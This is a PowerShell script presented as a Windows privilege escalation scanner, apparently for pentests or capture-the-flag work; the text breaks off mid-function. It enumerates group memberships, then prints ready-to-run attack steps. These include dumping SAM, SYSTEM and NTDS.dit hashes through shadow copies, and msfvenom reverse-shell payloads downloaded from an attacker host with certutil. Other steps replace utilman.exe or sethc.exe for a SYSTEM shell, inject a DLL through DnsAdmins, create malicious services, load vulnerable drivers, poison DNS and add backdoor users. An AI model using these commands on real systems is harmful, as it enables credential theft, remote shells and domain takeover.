#Requires -Version 2.0

<#
.SYNOPSIS
    Windows Local Privilege Escalation Scanner v4.0 - COMPLETE EDITION
    
.DESCRIPTION
    - ALL dangerous privileges with ALL exploitation methods
    - Multiple alternatives for every technique
    - Handles locked files (VSS/shadow copy)
    - Correct PowerShell syntax throughout
    
.NOTES
    Version: 4.0 - Complete Edition
#>

[CmdletBinding()]
param(
    [string]$AttackerIP,
    [int]$AttackerPort = 4444,
    [int]$WebPort = 8000
)

$ErrorActionPreference = "SilentlyContinue"

# ============================================================================
# FIND WRITABLE DIRECTORY
# ============================================================================

function Get-WritableDirectory {
    $candidates = @(
        $env:TEMP,
        $env:TMP,
        "$env:USERPROFILE",
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Documents",
        "C:\Windows\Temp",
        "C:\Temp",
        "$env:PUBLIC",
        "$env:APPDATA",
        "$env:LOCALAPPDATA",
        (Get-Location).Path
    )
    
    foreach ($dir in $candidates) {
        if ($dir -and (Test-Path $dir -ErrorAction SilentlyContinue)) {
            $testFile = Join-Path $dir "test_$([guid]::NewGuid().ToString().Substring(0,8)).tmp"
            try {
                [IO.File]::WriteAllText($testFile, "test")
                Remove-Item $testFile -Force -ErrorAction SilentlyContinue
                return $dir
            } catch { continue }
        }
    }
    return (Get-Location).Path
}

$Script:WorkDir = Get-WritableDirectory
$Script:CurrentUser = $env:USERNAME
$Script:CurrentDomain = $env:USERDOMAIN
$Script:FullUser = "$Script:CurrentDomain\$Script:CurrentUser"

$Script:Config = @{
    AttackerIP = $AttackerIP
    AttackerPort = $AttackerPort
    WebPort = $WebPort
    WorkDir = $Script:WorkDir
}

# ============================================================================
# OUTPUT FUNCTIONS
# ============================================================================

function Write-Banner {
    Write-Host ""
    Write-Host "================================================================" -ForegroundColor Cyan
    Write-Host " Windows Privilege Escalation Scanner v4.0 - COMPLETE EDITION" -ForegroundColor Cyan
    Write-Host " ALL Privileges | ALL Methods | ALL Alternatives" -ForegroundColor Cyan
    Write-Host "================================================================" -ForegroundColor Cyan
}

function Write-Section {
    param([string]$Title)
    Write-Host ""
    Write-Host ("=" * 70) -ForegroundColor Cyan
    Write-Host " $Title" -ForegroundColor Cyan
    Write-Host ("=" * 70) -ForegroundColor Cyan
}

function Write-SubSection {
    param([string]$Title)
    Write-Host ""
    Write-Host "--- $Title ---" -ForegroundColor Yellow
}

function Write-Finding {
    param([string]$Cat, [string]$Name, [string]$Sev, [string]$Status, [string]$Details)
    
    $color = switch ($Sev) {
        "CRITICAL" { "Magenta" }
        "HIGH" { "Red" }
        "MEDIUM" { "Yellow" }
        default { "White" }
    }
    
    Write-Host ""
    Write-Host "[!] $Cat : $Name" -ForegroundColor $color
    Write-Host "    Severity: $Sev" -ForegroundColor $color
    if ($Status) { Write-Host "    Status: $Status" -ForegroundColor $color }
    if ($Details) { Write-Host "    Details: $Details" -ForegroundColor White }
}

function Write-Method {
    param(
        [string]$Number,
        [string]$Title,
        [string[]]$Attacker,
        [string[]]$Victim,
        [string[]]$Notes
    )
    
    $aIP = $Script:Config.AttackerIP
    $aPort = $Script:Config.AttackerPort
    $wPort = $Script:Config.WebPort
    $wDir = $Script:Config.WorkDir
    $user = $Script:CurrentUser
    $fullUser = $Script:FullUser
    
    Write-Host ""
    Write-Host "[Method $Number] $Title" -ForegroundColor Green
    
    if ($Attacker -and $Attacker.Count -gt 0) {
        Write-Host ""
        Write-Host "  ATTACKER BOX:" -ForegroundColor Yellow
        foreach ($c in $Attacker) {
            $out = $c -replace 'YOURIP', $aIP -replace 'YOURPORT', $aPort -replace 'WEBPORT', $wPort
            Write-Host "    $out" -ForegroundColor White
        }
    }
    
    if ($Victim -and $Victim.Count -gt 0) {
        Write-Host ""
        Write-Host "  VICTIM (run here):" -ForegroundColor Yellow
        foreach ($c in $Victim) {
            $out = $c -replace 'YOURIP', $aIP -replace 'YOURPORT', $aPort -replace 'WEBPORT', $wPort `
                      -replace 'WORKDIR', $wDir -replace 'YOURUSER', $user -replace 'YOURFULLUSER', $fullUser
            Write-Host "    $out" -ForegroundColor White
        }
    }
    
    if ($Notes -and $Notes.Count -gt 0) {
        Write-Host ""
        Write-Host "  NOTES:" -ForegroundColor Cyan
        foreach ($n in $Notes) {
            Write-Host "    $n" -ForegroundColor Gray
        }
    }
}

# ============================================================================
# COMPLETE DANGEROUS PRIVILEGES DATABASE
# ============================================================================

$Script:DangerousPrivileges = @{
    # CRITICAL
    "SeImpersonatePrivilege" = @{ Severity = "CRITICAL"; Desc = "Impersonate tokens"; CanExploitDisabled = $false }
    "SeAssignPrimaryTokenPrivilege" = @{ Severity = "CRITICAL"; Desc = "Assign primary token"; CanExploitDisabled = $false }
    "SeBackupPrivilege" = @{ Severity = "CRITICAL"; Desc = "Read ANY file"; CanExploitDisabled = $true }
    "SeRestorePrivilege" = @{ Severity = "CRITICAL"; Desc = "Write ANY file"; CanExploitDisabled = $true }
    "SeDebugPrivilege" = @{ Severity = "CRITICAL"; Desc = "Debug any process"; CanExploitDisabled = $false }
    "SeTcbPrivilege" = @{ Severity = "CRITICAL"; Desc = "Act as OS - SYSTEM equivalent"; CanExploitDisabled = $false }
    "SeCreateTokenPrivilege" = @{ Severity = "CRITICAL"; Desc = "Create arbitrary tokens"; CanExploitDisabled = $false }
    "SeLoadDriverPrivilege" = @{ Severity = "CRITICAL"; Desc = "Load kernel drivers"; CanExploitDisabled = $true }
    "SeSyncAgentPrivilege" = @{ Severity = "CRITICAL"; Desc = "DCSync without DA"; CanExploitDisabled = $false }
    # HIGH
    "SeTakeOwnershipPrivilege" = @{ Severity = "HIGH"; Desc = "Take ownership of any object"; CanExploitDisabled = $true }
    "SeSecurityPrivilege" = @{ Severity = "HIGH"; Desc = "Manage security log"; CanExploitDisabled = $true }
    "SeSystemEnvironmentPrivilege" = @{ Severity = "HIGH"; Desc = "Modify firmware"; CanExploitDisabled = $true }
    "SeManageVolumePrivilege" = @{ Severity = "HIGH"; Desc = "Manage volumes/VSS"; CanExploitDisabled = $true }
    "SeTrustedCredManAccessPrivilege" = @{ Severity = "HIGH"; Desc = "Access Credential Manager"; CanExploitDisabled = $true }
    "SeRelabelPrivilege" = @{ Severity = "HIGH"; Desc = "Modify integrity labels"; CanExploitDisabled = $true }
    "SeEnableDelegationPrivilege" = @{ Severity = "HIGH"; Desc = "Enable delegation"; CanExploitDisabled = $false }
    "SeDelegateSessionUserImpersonatePrivilege" = @{ Severity = "HIGH"; Desc = "Session impersonation"; CanExploitDisabled = $false }
    # MEDIUM
    "SeCreateSymbolicLinkPrivilege" = @{ Severity = "MEDIUM"; Desc = "Create symlinks"; CanExploitDisabled = $true }
    "SeCreateGlobalPrivilege" = @{ Severity = "MEDIUM"; Desc = "Create global objects"; CanExploitDisabled = $false }
    "SeCreatePermanentPrivilege" = @{ Severity = "MEDIUM"; Desc = "Create permanent objects"; CanExploitDisabled = $false }
    "SeMachineAccountPrivilege" = @{ Severity = "MEDIUM"; Desc = "Add machines to domain"; CanExploitDisabled = $false }
    "SeAuditPrivilege" = @{ Severity = "MEDIUM"; Desc = "Generate audit events"; CanExploitDisabled = $true }
    "SeIncreaseQuotaPrivilege" = @{ Severity = "LOW"; Desc = "Adjust memory quotas"; CanExploitDisabled = $false }
    "SeIncreaseBasePriorityPrivilege" = @{ Severity = "LOW"; Desc = "Increase priority"; CanExploitDisabled = $false }
    "SeLockMemoryPrivilege" = @{ Severity = "LOW"; Desc = "Lock memory pages"; CanExploitDisabled = $false }
    "SeSystemtimePrivilege" = @{ Severity = "LOW"; Desc = "Change system time"; CanExploitDisabled = $false }
    "SeTimeZonePrivilege" = @{ Severity = "LOW"; Desc = "Change timezone"; CanExploitDisabled = $false }
    "SeShutdownPrivilege" = @{ Severity = "LOW"; Desc = "Shutdown system"; CanExploitDisabled = $false }
    "SeRemoteShutdownPrivilege" = @{ Severity = "LOW"; Desc = "Remote shutdown"; CanExploitDisabled = $false }
    "SeUndockPrivilege" = @{ Severity = "LOW"; Desc = "Undock laptop"; CanExploitDisabled = $false }
    "SeProfileSingleProcessPrivilege" = @{ Severity = "LOW"; Desc = "Profile process"; CanExploitDisabled = $false }
    "SeSystemProfilePrivilege" = @{ Severity = "LOW"; Desc = "Profile system"; CanExploitDisabled = $false }
    "SeCreatePagefilePrivilege" = @{ Severity = "LOW"; Desc = "Create pagefile"; CanExploitDisabled = $false }
    # INFO
    "SeChangeNotifyPrivilege" = @{ Severity = "INFO"; Desc = "Bypass traverse checking"; CanExploitDisabled = $false }
    "SeIncreaseWorkingSetPrivilege" = @{ Severity = "INFO"; Desc = "Increase working set"; CanExploitDisabled = $false }
}

# ============================================================================
# COMPLETE DANGEROUS GROUPS DATABASE
# ============================================================================

$Script:DangerousGroups = @{
    "Administrators" = @{ Severity = "CRITICAL"; Desc = "Full local admin" }
    "Domain Admins" = @{ Severity = "CRITICAL"; Desc = "Full domain admin" }
    "Enterprise Admins" = @{ Severity = "CRITICAL"; Desc = "Full forest admin" }
    "Schema Admins" = @{ Severity = "CRITICAL"; Desc = "Modify AD schema" }
    "Backup Operators" = @{ Severity = "CRITICAL"; Desc = "SeBackup+SeRestore" }
    "Server Operators" = @{ Severity = "CRITICAL"; Desc = "Services+Backup" }
    "Account Operators" = @{ Severity = "HIGH"; Desc = "Create/modify users" }
    "Print Operators" = @{ Severity = "HIGH"; Desc = "SeLoadDriverPrivilege" }
    "DnsAdmins" = @{ Severity = "CRITICAL"; Desc = "DLL injection on DC" }
    "Hyper-V Administrators" = @{ Severity = "CRITICAL"; Desc = "Full VM control" }
    "Group Policy Creator Owners" = @{ Severity = "HIGH"; Desc = "Create GPOs" }
    "Remote Desktop Users" = @{ Severity = "MEDIUM"; Desc = "RDP access" }
    "Remote Management Users" = @{ Severity = "MEDIUM"; Desc = "WinRM access" }
    "Distributed COM Users" = @{ Severity = "MEDIUM"; Desc = "DCOM access" }
    "Event Log Readers" = @{ Severity = "MEDIUM"; Desc = "Read logs" }
    "Cryptographic Operators" = @{ Severity = "MEDIUM"; Desc = "Crypto ops" }
    "Network Configuration Operators" = @{ Severity = "MEDIUM"; Desc = "Network config" }
    "Performance Log Users" = @{ Severity = "LOW"; Desc = "Perf logging" }
    "Performance Monitor Users" = @{ Severity = "LOW"; Desc = "Perf monitoring" }
    "Replicator" = @{ Severity = "MEDIUM"; Desc = "File replication" }
    "IIS_IUSRS" = @{ Severity = "LOW"; Desc = "IIS context" }
    "Certificate Service DCOM Access" = @{ Severity = "MEDIUM"; Desc = "Cert services" }
    "RDS Remote Access Servers" = @{ Severity = "MEDIUM"; Desc = "RDS access" }
    "RDS Endpoint Servers" = @{ Severity = "MEDIUM"; Desc = "RDS endpoint" }
    "RDS Management Servers" = @{ Severity = "MEDIUM"; Desc = "RDS mgmt" }
    "DHCP Administrators" = @{ Severity = "MEDIUM"; Desc = "DHCP admin" }
    "DHCP Users" = @{ Severity = "LOW"; Desc = "DHCP user" }
    "WINS Users" = @{ Severity = "LOW"; Desc = "WINS user" }
    "Access Control Assistance Operators" = @{ Severity = "LOW"; Desc = "ACL assistance" }
    "Storage Replica Administrators" = @{ Severity = "MEDIUM"; Desc = "Storage replica" }
}

# ============================================================================
# SYSTEM INFO
# ============================================================================

function Get-SystemInfo {
    Write-Section "SYSTEM INFORMATION"
    
    Write-Host "[*] Current User: $Script:FullUser" -ForegroundColor Gray
    Write-Host "[*] Hostname: $env:COMPUTERNAME" -ForegroundColor Gray
    Write-Host "[*] Working Directory: $Script:WorkDir" -ForegroundColor Gray
    
    # Test write
    $testFile = Join-Path $Script:WorkDir "test.tmp"
    try {
        [IO.File]::WriteAllText($testFile, "test")
        Remove-Item $testFile -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Working directory WRITABLE" -ForegroundColor Green
    } catch {
        Write-Host "[-] Working directory NOT writable!" -ForegroundColor Red
    }
    
    # OS
    $os = Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue
    if ($os) {
        Write-Host "[*] OS: $($os.Caption)" -ForegroundColor Gray
        Write-Host "[*] Build: $($os.BuildNumber)" -ForegroundColor Gray
        $Script:OSBuild = $os.BuildNumber
    }
    
    # Domain
    $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue
    if ($cs) {
        if ($cs.PartOfDomain) {
            Write-Host "[+] Domain: $($cs.Domain)" -ForegroundColor Green
            $Script:IsDomainJoined = $true
            
            # Check if DC
            $dc = Get-WmiObject Win32_ComputerSystem | Where-Object { $_.DomainRole -ge 4 }
            if ($dc) {
                Write-Host "[+] THIS IS A DOMAIN CONTROLLER!" -ForegroundColor Magenta
                $Script:IsDC = $true
            }
        } else {
            Write-Host "[*] Workgroup: $($cs.Domain)" -ForegroundColor Gray
            $Script:IsDomainJoined = $false
        }
    }
}

# ============================================================================
# GROUP MEMBERSHIP
# ============================================================================

function Get-GroupMemberships {
    Write-Section "GROUP MEMBERSHIP ANALYSIS"
    
    $output = whoami /groups 2>$null
    if (-not $output) {
        Write-Host "[-] Could not enumerate groups" -ForegroundColor Red
        return
    }
    
    Write-Host "[*] Checking group memberships..." -ForegroundColor Gray
    Write-Host ""
    
    $foundDangerous = @()
    
    foreach ($line in $output) {
        if ($line -match "^GROUP|^-|^=|^\s*$") { continue }
        
        $groupName = ($line -split '\s{2,}')[0]
        if (-not $groupName -or $groupName.Length -lt 2) { continue }
        
        $isDangerous = $false
        $matchedKey = $null
        
        foreach ($dgKey in $Script:DangerousGroups.Keys) {
            $pattern = $dgKey -replace ' ', '.*'
            if ($groupName -match $pattern) {
                $isDangerous = $true
                $matchedKey = $dgKey
                break
            }
        }
        
        if ($isDangerous) {
            Write-Host "  [!!!] $groupName" -ForegroundColor Red
            $foundDangerous += @{ Name = $groupName; Key = $matchedKey }
        } else {
            Write-Host "  [*] $groupName" -ForegroundColor Gray
        }
    }
    
    if ($foundDangerous.Count -gt 0) {
        Write-Section "DANGEROUS GROUPS - ALL EXPLOITATION METHODS"
        
        foreach ($g in $foundDangerous) {
            $info = $Script:DangerousGroups[$g.Key]
            if ($info) {
                Write-Finding -Cat "GROUP" -Name $g.Name -Sev $info.Severity -Details $info.Desc
                Show-AllGroupExploits -GroupName $g.Name
            }
        }
    }
}

# ============================================================================
# ALL GROUP EXPLOITATION METHODS
# ============================================================================

function Show-AllGroupExploits {
    param([string]$GroupName)
    
    $gn = $GroupName.ToLower()
    
    # =========================================================================
    # BACKUP OPERATORS - Complete exploitation guide
    # =========================================================================
    if ($gn -match "backup") {
        Write-SubSection "BACKUP OPERATORS - ALL METHODS"
        
        Write-Host ""
        Write-Host "  [INFO] This group grants SeBackupPrivilege and SeRestorePrivilege" -ForegroundColor Cyan
        Write-Host "  [INFO] You can READ and WRITE any file on the system!" -ForegroundColor Cyan
        
        # Method 1
        Write-Method -Number "1" -Title "Extract SAM/SYSTEM via reg save (requires elevated cmd)" `
            -Attacker @(
                '# Start SMB server:',
                'impacket-smbserver share . -smb2support',
                '',
                '# After getting files:',
                'impacket-secretsdump -sam SAM -system SYSTEM LOCAL'
            ) `
            -Victim @(
                '# Run from elevated CMD (not PowerShell):',
                'reg save HKLM\SAM WORKDIR\SAM',
                'reg save HKLM\SYSTEM WORKDIR\SYSTEM',
                'reg save HKLM\SECURITY WORKDIR\SECURITY',
                '',
                '# Transfer:',
                'copy WORKDIR\SAM \\YOURIP\share\',
                'copy WORKDIR\SYSTEM \\YOURIP\share\'
            ) `
            -Notes @('Requires elevated command prompt', 'May fail if files locked')
        
        # Method 2
        Write-Method -Number "2" -Title "Extract via robocopy /b (backup mode)" `
            -Attacker @(
                'impacket-secretsdump -sam SAM -system SYSTEM LOCAL'
            ) `
            -Victim @(
                'robocopy /b C:\Windows\System32\config WORKDIR SAM SYSTEM SECURITY'
            ) `
            -Notes @('Uses backup semantics to bypass ACLs', 'May still fail on locked files')
        
        # Method 3
        Write-Method -Number "3" -Title "Extract via Shadow Copy (BEST FOR LOCKED FILES)" `
            -Attacker @(
                'impacket-secretsdump -sam SAM -system SYSTEM LOCAL'
            ) `
            -Victim @(
                '# Create shadow copy:',
                'wmic shadowcopy call create Volume=C:\',
                '',
                '# List shadows to get ID:',
                'vssadmin list shadows',
                '',
                '# Copy from shadow (adjust ID):',
                'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM WORKDIR\',
                'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM WORKDIR\',
                'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY WORKDIR\'
            ) `
            -Notes @('Works even when files are locked!', 'Most reliable method')
        
        # Method 4
        Write-Method -Number "4" -Title "Extract via diskshadow (scripted)" `
            -Attacker @(
                'impacket-secretsdump -sam SAM -system SYSTEM LOCAL'
            ) `
            -Victim @(
                '# Create script file:',
                'echo set context persistent nowriters > WORKDIR\shadow.txt',
                'echo add volume c: alias myDrive >> WORKDIR\shadow.txt',
                'echo create >> WORKDIR\shadow.txt',
                'echo expose %myDrive% z: >> WORKDIR\shadow.txt',
                '',
                '# Execute:',
                'diskshadow /s WORKDIR\shadow.txt',
                '',
                '# Copy from exposed drive:',
                'robocopy /b z:\Windows\System32\config WORKDIR SAM SYSTEM SECURITY',
                '',
                '# Cleanup:',
                'diskshadow',
                'delete shadows volume c:',
                'exit'
            ) `
            -Notes @('Creates persistent shadow', 'Exposes as drive letter')
        
        # Method 5
        Write-Method -Number "5" -Title "Extract via wbadmin (Windows Backup)" `
            -Attacker @(
                'impacket-secretsdump -sam SAM -system SYSTEM LOCAL'
            ) `
            -Victim @(
                '# Backup registry to network share:',
                'wbadmin start backup -backuptarget:\\YOURIP\share -include:C:\Windows\System32\config -quiet',
                '',
                '# OR backup locally:',
                'wbadmin start backup -backuptarget:E: -include:C:\Windows\System32\config -quiet'
            ) `
            -Notes @('May require additional disk space', 'Good for DC NTDS.dit')
        
        # Method 6 - NTDS.dit
        Write-Method -Number "6" -Title "Extract NTDS.dit (Domain Controller)" `
            -Attacker @(
                'impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL'
            ) `
            -Victim @(
                '# Create shadow:',
                'wmic shadowcopy call create Volume=C:\',
                '',
                '# List and note ID:',
                'vssadmin list shadows',
                '',
                '# Copy NTDS.dit:',
                'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit WORKDIR\',
                'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM WORKDIR\',
                'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY WORKDIR\'
            ) `
            -Notes @('Only works on Domain Controllers', 'Contains ALL domain hashes!')
        
        # Method 7 - ntdsutil
        Write-Method -Number "7" -Title "Extract NTDS.dit via ntdsutil (DC)" `
            -Attacker @(
                'impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL'
            ) `
            -Victim @(
                'ntdsutil "ac i ntds" "ifm" "create full WORKDIR\ntds" q q'
            ) `
            -Notes @('Creates IFM backup with NTDS.dit', 'Registry hives included')
        
        # Method 8 - SeRestorePrivilege abuse
        Write-Method -Number "8" -Title "SeRestorePrivilege - Replace utilman.exe (SYSTEM shell at login)" `
            -Attacker @(
                'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe -o evil.exe',
                'python3 -m http.server WEBPORT',
                'nc -lvnp YOURPORT'
            ) `
            -Victim @(
                '# Download payload:',
                'certutil -urlcache -f http://YOURIP:WEBPORT/evil.exe WORKDIR\evil.exe',
                '',
                '# Replace utilman (Win+U at lock screen):',
                'robocopy /b WORKDIR C:\Windows\System32 evil.exe /A-:R',
                'ren C:\Windows\System32\Utilman.exe Utilman.bak',
                'ren C:\Windows\System32\evil.exe Utilman.exe',
                '',
                '# Trigger: Lock screen (Win+L) then press Win+U'
            ) `
            -Notes @('Gives SYSTEM shell at login screen', 'Press Win+U to trigger')
        
        # Method 9
        Write-Method -Number "9" -Title "SeRestorePrivilege - Replace sethc.exe (Sticky Keys)" `
            -Attacker @(
                'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe -o evil.exe',
                'python3 -m http.server WEBPORT',
                'nc -lvnp YOURPORT'
            ) `
            -Victim @(
                'certutil -urlcache -f http://YOURIP:WEBPORT/evil.exe WORKDIR\evil.exe',
                '',
                '# Replace sethc (5x Shift at lock screen):',
                'robocopy /b WORKDIR C:\Windows\System32 evil.exe',
                'ren C:\Windows\System32\sethc.exe sethc.bak',
                'ren C:\Windows\System32\evil.exe sethc.exe',
                '',
                '# Trigger: Lock screen then press Shift 5 times'
            ) `
            -Notes @('Gives SYSTEM shell at login screen', 'Press Shift 5 times')
        
        # Method 10
        Write-Method -Number "10" -Title "SeRestorePrivilege - DLL Hijacking (Service)" `
            -Attacker @(
                'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f dll -o evil.dll',
                'python3 -m http.server WEBPORT',
                'nc -lvnp YOURPORT'
            ) `
            -Victim @(
                '# Find service with missing DLL (use procmon or known paths):',
                '# Common targets: version.dll, uxtheme.dll, etc.',
                '',
                'certutil -urlcache -f http://YOURIP:WEBPORT/evil.dll WORKDIR\evil.dll',
                '',
                '# Place DLL in service directory:',
                'robocopy /b WORKDIR "C:\Program Files\SomeService" evil.dll',
                '',
                '# Restart service or wait for reboot'
            ) `
            -Notes @('Need to identify DLL hijacking opportunity', 'Check with procmon')
        
        # Method 11
        Write-Method -Number "11" -Title "Read ANY sensitive file" `
            -Attacker @() `
            -Victim @(
                '# Copy any file using backup semantics:',
                'robocopy /b C:\Users\Administrator\Desktop WORKDIR root.txt',
                'type WORKDIR\root.txt',
                '',
                '# Or read directly with PowerShell:',
                '[IO.File]::ReadAllText("C:\Users\Administrator\Desktop\root.txt")'
            ) `
            -Notes @('Can read any file on system', 'Including encrypted files')
    }
    
    # =========================================================================
    # SERVER OPERATORS
    # =========================================================================
    if ($gn -match "server.*operator") {
        Write-SubSection "SERVER OPERATORS - ALL METHODS"
        
        Write-Method -Number "1" -Title "Modify service binary path" `
            -Attacker @(
                'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe-service -o svc.exe',
                'python3 -m http.server WEBPORT',
                'nc -lvnp YOURPORT'
            ) `
            -Victim @(
                'certutil -urlcache -f http://YOURIP:WEBPORT/svc.exe WORKDIR\svc.exe',
                '',
                '# List services:',
                'sc query type= service state= all',
                '',
                '# Modify a service (AppReadiness often works):',
                'sc config AppReadiness binpath= "WORKDIR\svc.exe"',
                'sc stop AppReadiness',
                'sc start AppReadiness'
            ) `
            -Notes @('Service must be startable by you', 'Try multiple services if one fails')
        
        Write-Method -Number "2" -Title "Replace service binary directly" `
            -Attacker @(
                'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe-service -o svc.exe',
                'python3 -m http.server WEBPORT'
            ) `
            -Victim @(
                '# Find service binary:',
                'sc qc TargetService',
                '',
                '# Backup and replace:',
                'copy "C:\Path\To\service.exe" "C:\Path\To\service.exe.bak"',
                'certutil -urlcache -f http://YOURIP:WEBPORT/svc.exe "C:\Path\To\service.exe"',
                '',
                '# Restart:',
                'sc stop TargetService',
                'sc start TargetService'
            ) `
            -Notes @('May need SeBackupPrivilege for backup', 'Check service permissions first')
        
        Write-Method -Number "3" -Title "Create new service" `
            -Attacker @(
                'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe-service -o svc.exe',
                'python3 -m http.server WEBPORT',
                'nc -lvnp YOURPORT'
            ) `
            -Victim @(
                'certutil -urlcache -f http://YOURIP:WEBPORT/svc.exe WORKDIR\svc.exe',
                '',
                '# Create service:',
                'sc create EvilSvc binpath= "WORKDIR\svc.exe" start= auto',
                'sc start EvilSvc'
            ) `
            -Notes @('Requires sc create permissions', 'Service runs as SYSTEM by default')
        
        # Also has backup privs
        Write-Host ""
        Write-Host "  [INFO] Server Operators also have Backup privileges!" -ForegroundColor Cyan
        Write-Host "  [INFO] See Backup Operators methods above." -ForegroundColor Cyan
    }
    
    # =========================================================================
    # PRINT OPERATORS
    # =========================================================================
    if ($gn -match "print.*operator") {
        Write-SubSection "PRINT OPERATORS - ALL METHODS"
        
        Write-Method -Number "1" -Title "Load vulnerable driver (Capcom.sys)" `
            -Attacker @(
                'git clone https://github.com/FuzzySecurity/Capcom-Rootkit',
                '# Compile or download ExploitCapcom.exe',
                'python3 -m http.server WEBPORT'
            ) `
            -Victim @(
                'certutil -urlcache -f http://YOURIP:WEBPORT/Capcom.sys WORKDIR\Capcom.sys',
                'certutil -urlcache -f http://YOURIP:WEBPORT/ExploitCapcom.exe WORKDIR\ec.exe',
                '',
                'WORKDIR\ec.exe'
            ) `
            -Notes @('Classic BYOVD attack', 'Capcom.sys allows kernel code execution')
        
        Write-Method -Number "2" -Title "Load vulnerable driver (RTCore64.sys)" `
            -Attacker @(
                '# Get RTCore64.sys from MSI Afterburner',
                'python3 -m http.server WEBPORT'
            ) `
            -Victim @(
                '# RTCore64.sys allows arbitrary kernel memory R/W',
                'certutil -urlcache -f http://YOURIP:WEBPORT/RTCore64.sys WORKDIR\RTCore64.sys',
                '',
                '# Use PPLKiller or custom exploit'
            ) `
            -Notes @('From MSI Afterburner', 'Allows PPL bypass')
        
        Write-Method -Number "3" -Title "Load vulnerable driver (DBUtil_2_3.sys)" `
            -Attacker @(
                '# Get DBUtil_2_3.sys from Dell drivers',
                'python3 -m http.server WEBPORT'
            ) `
            -Victim @(
                'certutil -urlcache -f http://YOURIP:WEBPORT/DBUtil_2_3.sys WORKDIR\dbu.sys',
                '',
                '# Use with appropriate exploit tool'
            ) `
            -Notes @('CVE-2021-21551', 'Dell driver vulnerability')
    }
    
    # =========================================================================
    # DNSADMINS
    # =========================================================================
    if ($gn -match "dnsadmin") {
        Write-SubSection "DNSADMINS - ALL METHODS"
        
        Write-Method -Number "1" -Title "DLL injection via serverlevelplugindll (SMB)" `
            -Attacker @(
                'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f dll -o dns.dll',
                'impacket-smbserver share . -smb2support',
                'nc -lvnp YOURPORT'
            ) `
            -Victim @(
                '# Get DC name:',
                'hostname',
                '',
                '# Set plugin DLL (run on DC):',
                'dnscmd DC_HOSTNAME /config /serverlevelplugindll \\YOURIP\share\dns.dll',
                '',
                '# Restart DNS:',
                'sc stop dns',
                'sc start dns'
            ) `
            -Notes @('DLL must be accessible via SMB', 'Runs as SYSTEM on DC!')
        
        Write-Method -Number "2" -Title "DLL injection via serverlevelplugindll (local)" `
            -Attacker @(
                'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f dll -o dns.dll',
                'python3 -m http.server WEBPORT',
                'nc -lvnp YOURPORT'
            ) `
            -Victim @(
                '# Upload DLL locally:',
                'certutil -urlcache -f http://YOURIP:WEBPORT/dns.dll C:\Windows\Temp\dns.dll',
                '',
                '# Set plugin:',
                'dnscmd localhost /config /serverlevelplugindll C:\Windows\Temp\dns.dll',
                '',
                '# Restart:',
                'sc stop dns',
                'sc start dns'
            ) `
            -Notes @('DLL stored locally on DC', 'More reliable than SMB')
        
        Write-Method -Number "3" -Title "DNS record poisoning" `
            -Attacker @() `
            -Victim @(
                '# Add malicious A record:',
                'dnscmd /recordadd DOMAIN.COM attacker A YOURIP',
                '',
                '# Add malicious CNAME:',
                'dnscmd /recordadd DOMAIN.COM www CNAME attacker.evil.com'
            ) `
            -Notes @('Redirect traffic to attacker', 'Useful for MITM')
    }
    
    # =========================================================================
    # HYPER-V ADMINISTRATORS
    # =========================================================================
    if ($gn -match "hyper-v") {
        Write-SubSection "HYPER-V ADMINISTRATORS - ALL METHODS"
        
        Write-Method -Number "1" -Title "Clone/export VM disk" `
            -Attacker @(
                '# Mount exported VHDX and extract secrets'
            ) `
            -Victim @(
                '# List VMs:',
                'Get-VM',
                '',
                '# Export VM:',
                'Export-VM -Name "DC01" -Path WORKDIR\',
                '',
                '# Access virtual disk:',
                'Mount-VHD -Path "WORKDIR\DC01\Virtual Hard Disks\disk.vhdx"',
                '',
                '# Now access mounted drive and copy SAM/NTDS.dit'
            ) `
            -Notes @('Can compromise any VM', 'Including Domain Controllers!')
        
        Write-Method -Number "2" -Title "Create VM with physical disk access" `
            -Attacker @() `
            -Victim @(
                '# Create VM with pass-through disk:',
                'New-VM -Name "EvilVM" -MemoryStartupBytes 1GB',
                'Add-VMHardDiskDrive -VMName "EvilVM" -DiskNumber 0',
                '',
                '# Boot from live CD and access host disk'
            ) `
            -Notes @('Physical disk passthrough', 'Bypass all host security')
        
        Write-Method -Number "3" -Title "Snapshot and extract" `
            -Attacker @() `
            -Victim @(
                '# Create snapshot:',
                'Checkpoint-VM -Name "TargetVM" -SnapshotName "Exfil"',
                '',
                '# Export snapshot:',
                'Export-VMSnapshot -VMName "TargetVM" -Name "Exfil" -Path WORKDIR\'
            ) `
            -Notes @('Non-destructive', 'VM keeps running')
    }
    
    # =========================================================================
    # ACCOUNT OPERATORS
    # =========================================================================
    if ($gn -match "account.*operator") {
        Write-SubSection "ACCOUNT OPERATORS - ALL METHODS"
        
        Write-Method -Number "1" -Title "Create new privileged user" `
            -Attacker @() `
            -Victim @(
                '# Create domain user:',
                'net user hacker Password123! /add /domain',
                '',
                '# Add to useful groups:',
                'net group "Remote Desktop Users" hacker /add /domain',
                'net group "Remote Management Users" hacker /add /domain',
                '',
                '# Cannot add to Domain Admins directly!'
            ) `
